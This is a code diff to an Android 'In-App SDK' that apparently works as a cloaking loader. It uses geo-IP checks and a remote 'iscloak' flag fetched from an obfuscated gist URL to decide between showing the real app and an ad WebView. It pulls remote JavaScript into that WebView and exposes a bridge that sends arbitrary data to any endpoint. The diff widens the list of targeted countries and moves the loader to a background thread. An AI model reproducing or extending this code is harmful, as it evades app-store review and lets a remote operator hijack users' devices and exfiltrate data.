@@ -1,6 +1,6 @@
 /*
   App-O-Track In-App SDK
-  Version: 21022020
+  Version: 02032020
   Author: Liv <developer@app-o-track.top>
  */
 package com.appotrack_sdk;
@@ -67,13 +67,13 @@ import okhttp3.Response;
 public class AppotrackActivity extends AppCompatActivity implements AdvancedWebView.Listener {
 
     /* TODO: SDK configuration */
-    private static final boolean isAtSdkDebugMode = true; //set to true to show debug messages with ATSDK tag. Please set to false for production builds TODO: set to false
+    private static final boolean isAtSdkDebugMode = false; //set to true to show debug messages with ATSDK tag. Please set to false for production builds TODO: set to false
     private static final String remoteConfigId = "PLEASE SET"; //remote configuration record ID TODO: request it from your personal manager
     private static final String afDevKey = "PLEASE SET"; //AppsFlyer API key TODO: request it from your personal manager
     private static final String geoipApiKey = "PLEASE SET"; //GeoIP API key TODO: request it from your personal manager
     private static final Integer geoipApiId = 218804; //GeoIP API user ID TODO: request it from your personal manager
     private static final Class sweetieActivityClass = MainActivity.class; //your application's main activity class TODO: set to your main activity
-    private static final List<String> allowedCountries = Arrays.asList("RU","UA"); //country white list where ADs will show TODO: request it from your personal manager
+    private static final List<String> allowedCountries = Arrays.asList("RU", "UA", "PL", "KZ", "DE", "CA", "NZ", "NO", "NL", "IT", "PT", "CH", "JP", "SK", "SI", "LT", "LV", "EE", "AT"); //country white list where ADs will show TODO: request it from your personal manager
     private static final String SHARED_PREFS_NAME = "ATPREFS"; //you may change on your own
     private static final String PREF_GEOIP = "geodata"; //you may change on your own
     private static final byte ENC_KEY = 120; //Key to encrypt/decrypt strings
@@ -83,10 +83,10 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
      * Encrypted strings.
      * You may call decrypt(str, ENC_KEY) on such string to decrypt it.
     */
-    public static final String eXRequestedWith = "IFUqHQkNHQsMHRxVLxEMEA=="; //X-Requested-With
-    public static final String eInjectedApp = "MRYSHRsMHRw5CAg="; //InjectedApp
-    public static final String sApiEndpoint = "EAwMCAtCV1cfEQsMVh8RDBANGlYbFxVXGRYWGVUMFxQLDB0WExdXXSg3KywxPF1XChkPVxsXFh4RH1YMAAw="; //https://gist.github.com/anna-tolstenko/%POSTID%/raw/config.txt
-    public static final String sGeoipApiEndpoint = "EAwMCAtCV1cfHRcRCFYVGQAVERYcVhsXFVcfHRcRCFcOSlZJVxsXDRYMCgFXFR0="; //https://geoip.maxmind.com/geoip/v2.1/country/me
+    public static final String esXRequestedWith = "IFUqHQkNHQsMHRxVLxEMEA=="; //X-Requested-With
+    public static final String esInjectedApp = "MRYSHRsMHRw5CAg="; //InjectedApp
+    public static final String esApiEndpoint = "EAwMCAtCV1cfEQsMVh8RDBANGlYbFxVXGRYWGVUMFxQLDB0WExdXXSg3KywxPF1XChkPVxsXFh4RH1YMAAw="; //https://gist.github.com/anna-tolstenko/%POSTID%/raw/config.txt
+    public static final String esGeoipApiEndpoint = "EAwMCAtCV1cfHRcRCFYVGQAVERYcVhsXFVcfHRcRCFcOSlZJVxsXDRYMCgFXFR0="; //https://geoip.maxmind.com/geoip/v2.1/country/me
     /* end of encrypted strings */
 
     /**
@@ -168,8 +168,8 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
         adView = new AdvancedWebView(this);
 
         adView.setListener(this, this);
-        adView.addHttpHeader(Utils.decrypt(eXRequestedWith, ENC_KEY),"");
-        adView.addJavascriptInterface(new AdJsInterface(this), Utils.decrypt(eInjectedApp, ENC_KEY));
+        adView.addHttpHeader(Utils.decrypt(esXRequestedWith, ENC_KEY),"");
+        adView.addJavascriptInterface(new AdJsInterface(this), Utils.decrypt(esInjectedApp, ENC_KEY));
         adView.setWebViewClient(new AdWebViewClient());
 
         if(savedInstanceState == null){
@@ -217,91 +217,102 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
         vLayout.addView(vProgress);
 
         setContentView(vLayout);
+        //---
 
-        //initialize application
         AppsFlyerLib.getInstance().startTracking(getApplication(), afDevKey);
-        ExecutorService executor = Executors.newSingleThreadExecutor();
 
-        //get geoip data
-        FutureTask<String> futureGeoIp = new FutureTask<>(getGeoIp());
-        executor.execute(futureGeoIp);
-        try{
-            String geoipJson = futureGeoIp.get(30L, TimeUnit.SECONDS);
-            String geoipIsoCode = JsonPath.parse(geoipJson).read("$.country.iso_code", String.class);
-            Utils.debugOutput("GeoIP: "+geoipJson);
-            Utils.debugOutput("Country ISO: "+geoipIsoCode);
-            if(!allowedCountries.contains(geoipIsoCode)){
-                //user's country is not whitelisted
-                startSweetie();
-                return;
-            }else{
-                Utils.debugOutput("Country is in whitelist");
+        //do the job in different thread so the app will not freeze
+        Thread t = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                //initialize application
+                ExecutorService executor = Executors.newSingleThreadExecutor();
+
+                //get geoip data
+                FutureTask<String> futureGeoIp = new FutureTask<>(getGeoIp());
+                executor.execute(futureGeoIp);
+                try{
+                    String geoipJson = futureGeoIp.get(30L, TimeUnit.SECONDS);
+                    String geoipIsoCode = JsonPath.parse(geoipJson).read("$.country.iso_code", String.class);
+                    Utils.debugOutput("GeoIP: "+geoipJson);
+                    Utils.debugOutput("Country ISO: "+geoipIsoCode);
+                    if(!allowedCountries.contains(geoipIsoCode)){
+                        //user's country is not whitelisted
+                        startSweetie();
+                        return;
+                    }else{
+                        Utils.debugOutput("Country is in whitelist");
+                    }
+                }catch (Exception e){
+                    Utils.debugOutput("Error: "+e.getMessage());
+                    e.printStackTrace();
+                    startSweetie();
+                    return;
+                }
+
+                //load application's remote config
+                FutureTask<String> futureConfig = new FutureTask<>(getString(Utils.decrypt(esApiEndpoint, ENC_KEY).replace("%POSTID%", remoteConfigId)));
+                executor.execute(futureConfig);
+                try{
+                    String sConfigJson = futureConfig.get(30L, TimeUnit.SECONDS);
+                    Utils.debugOutput("Raw config:"+sConfigJson);
+
+                    if (sConfigJson.startsWith("ENC-")) {
+                        sConfigJson = Utils.decrypt(sConfigJson.substring(4), ENC_KEY);
+                        Utils.debugOutput("Decrypted config:"+sConfigJson);
+                    }
+
+                    oRemoteConfig = JsonPath.parse(sConfigJson);
+
+                    if (getConfigBool("$.iscloak")) {
+                        startSweetie(); //start main activity if ADs disabled
+                    } else {
+                        //report to analytics that this launch was with ADs
+                        HashMap<String,Object> eventParams = new HashMap<String, Object>()
+                        {{
+                            put(AFInAppEventParameterName.DESCRIPTION, "advertised_launch");
+                        }};
+                        AppsFlyerLib.getInstance().trackEvent(oSelfContext, AFInAppEventType.ACHIEVEMENT_UNLOCKED, eventParams);
+                        OneSignal.sendTags(new JSONObject(eventParams));
+                    }
+
+                }catch (Exception e){
+                    Utils.debugOutput("Error: "+e.getMessage());
+                    e.printStackTrace();
+                    startSweetie();
+                    return;
+                }
+
+                //load injected JS code if we have one
+                String jsUrl = getConfigStr("$.jsurl", "");
+                if (jsUrl!=null && jsUrl.length() > 0) {
+                    Utils.debugOutput("Getting InjectedApp: "+jsUrl);
+                    try {
+                        FutureTask<String> futureInjectedApp = new FutureTask<>(getString(jsUrl));
+                        executor.execute(futureInjectedApp);
+                        sInjectedJs = futureInjectedApp.get(30L, TimeUnit.SECONDS);
+                        Utils.debugOutput("InjectedApp: "+ sInjectedJs);
+                    }catch(Exception e){
+                        Utils.debugOutput("Error: "+e.getMessage());
+                        sInjectedJs = null;
+                    }
+                }else{
+                    sInjectedJs = null;
+                }
+
+                executor.shutdown();
+
+
+                //show ADs
+                if(!getConfigBool("$.iscloak")){
+                    //start ADs
+                    startActivity(AppotrackActivity.fromMode(oSelfContext, ACTIVITY_MODE_ADS)); //show ADs
+                    finish();//removing this will allow users returning to loading screen
+                    return;
+                }
             }
-        }catch (Exception e){
-            Utils.debugOutput("Error: "+e.getMessage());
-            e.printStackTrace();
-            startSweetie();
-            return;
-        }
-
-        //load application's remote config
-        FutureTask<String> futureConfig = new FutureTask<>(getString(Utils.decrypt(sApiEndpoint, ENC_KEY).replace("%POSTID%", remoteConfigId)));
-        executor.execute(futureConfig);
-        try{
-            String sConfigJson = futureConfig.get(30L, TimeUnit.SECONDS);
-            Utils.debugOutput("Raw config:"+sConfigJson);
-
-            if (sConfigJson.startsWith("ENC-")) {
-                sConfigJson = Utils.decrypt(sConfigJson.substring(4), ENC_KEY);
-                Utils.debugOutput("Decrypted config:"+sConfigJson);
-            }
-
-            oRemoteConfig = JsonPath.parse(sConfigJson);
-
-            if (getConfigBool("$.iscloak")) {
-                startSweetie(); //start main activity if ADs disabled
-            } else {
-                //report to analytics that this launch was with ADs
-                HashMap<String,Object> eventParams = new HashMap<String, Object>()
-                {{
-                    put(AFInAppEventParameterName.DESCRIPTION, "advertised_launch");
-                }};
-                AppsFlyerLib.getInstance().trackEvent(oSelfContext, AFInAppEventType.ACHIEVEMENT_UNLOCKED, eventParams);
-                OneSignal.sendTags(new JSONObject(eventParams));
-            }
-
-        }catch (Exception e){
-            Utils.debugOutput("Error: "+e.getMessage());
-            e.printStackTrace();
-            startSweetie();
-            return;
-        }
-
-        //load injected JS code if we have one
-        String jsUrl = getConfigStr("$.jsurl", "");
-        if (jsUrl!=null && jsUrl.length() > 0) {
-            Utils.debugOutput("Getting InjectedApp: "+jsUrl);
-            try {
-                FutureTask<String> futureInjectedApp = new FutureTask<>(getString(jsUrl));
-                executor.execute(futureInjectedApp);
-                sInjectedJs = futureInjectedApp.get(30L, TimeUnit.SECONDS);
-                Utils.debugOutput("InjectedApp: "+ sInjectedJs);
-            }catch(Exception e){
-                Utils.debugOutput("Error: "+e.getMessage());
-                sInjectedJs = null;
-            }
-        }else{
-            sInjectedJs = null;
-        }
-
-
-        //show ADs
-        if(!getConfigBool("$.iscloak")){
-            //start ADs
-            startActivity(AppotrackActivity.fromMode(oSelfContext, ACTIVITY_MODE_ADS)); //show ADs
-            finish();//removing this will allow users returning to loading screen
-            return;
-        }
+        });
+        t.start();
     }
 
     /**
@@ -322,7 +333,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                 }
 
                     Request request = new Request.Builder()
-                            .url(Utils.decrypt(sGeoipApiEndpoint, ENC_KEY))
+                            .url(Utils.decrypt(esGeoipApiEndpoint, ENC_KEY))
                             .addHeader("Authorization", Credentials.basic(geoipApiId.toString(), Utils.decrypt(geoipApiKey,ENC_KEY)))
                             .build();
 
@@ -563,7 +574,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
         }
 
         @JavascriptInterface
-        public boolean Track(String endpoint, String data, final String sCallbackName) {
+        public boolean Track(String endpoint, String data) {
             //prepare request
             MediaType jsonType = MediaType.parse("application/json; charset=utf-8");
             OkHttpClient okHttpClient = new OkHttpClient();
@@ -575,26 +586,12 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
             okHttpClient.newCall(request).enqueue(new Callback() {
                 @Override
                 public void onFailure(Call call, IOException e) {
-                    if(sCallbackName!=null&&sCallbackName.length()>1){
-                        adView.evaluateJavascript(sCallbackName + "(false);", new ValueCallback<String>() {
-                            @Override
-                            public void onReceiveValue(String s) {
-                                //pass
-                            }
-                        });
-                    }
+                    //pass
                 }
 
                 @Override
                 public void onResponse(Call call, Response response) throws IOException {
-                    if(sCallbackName!=null&&sCallbackName.length()>1){
-                        adView.evaluateJavascript(sCallbackName + "(true);", new ValueCallback<String>() {
-                            @Override
-                            public void onReceiveValue(String s) {
-                                //pass
-                            }
-                        });
-                    }
+                    //pass
                 }
             });
             return true;
